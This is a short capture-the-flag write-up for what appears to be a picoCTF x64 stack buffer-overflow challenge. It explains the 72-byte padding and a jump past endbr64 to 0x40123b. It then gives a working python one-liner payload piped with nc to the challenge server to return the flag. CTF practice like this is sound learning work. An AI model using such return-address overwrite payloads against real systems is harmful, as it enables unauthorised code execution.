im more used to x64 exploiting and assembly
than x86 so this plot twist the author 
has implemented actually worked in my favor

we read the stack is x40 which is 64 bytes
the rbp pushed is 8 so the padding is 72

we want to avoid the intel control expansion
instruction set's endbr64 so we jump ahead of
it to 0x40123b, we make our payload and
send it through the command line so 
that i dont bother writing a .py file

 python -c "import sys; sys.stdout.buffer.write(b'='*72 + b'\x3b\x12\x40\x00\x00\x00\x00\x00\x0a')" | nc saturn.picoctf.net 55141 1>flag

 and we get the flag
